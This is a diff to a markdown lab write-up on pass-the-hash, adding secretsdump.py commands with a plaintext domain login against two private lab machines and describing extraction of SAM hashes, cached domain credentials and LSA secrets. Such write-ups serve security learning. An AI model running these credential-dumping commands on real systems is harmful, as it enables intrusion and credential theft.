@@ -136,7 +136,13 @@ I'm SYSTEM on VICTIM-1. Now I want to do a proper full hash dump.
 
 ## Step 2 — Deeper Dump with secretsdump
 
-CME already grabbed the SAM hashes, but secretsdump gives more — cached domain logins, LSA secrets, machine account keys. Ran it against both machines:
+```bash
+secretsdump.py readteambd/rahimkhan:Password1@192.168.5.135
+```
+
+Although `CrackMapExec` had already dumped the local SAM hashes, `secretsdump.py` can extract additional information such as cached domain credentials, LSA secrets, and machine account keys.
+
+I ran it against both compromised machines to collect as much credential material as possible.
 
 VICTIM-1:
 
@@ -178,7 +184,9 @@ NL$KM:4b8fca52bf95f183bd044d00f506d9a5d7acc0e8e595e93ceab740ae2e583afacbd830185a
   <img src="/writeups/04-pass the hash/images/step2-1.png" width="600">
 </p>
 
-
+```bash
+secretsdump.py readteambd/rahimkhan:Password1@192.168.5.136
+```
 VICTIM-2:
 ```
 [*] Service RemoteRegistry is in stopped state
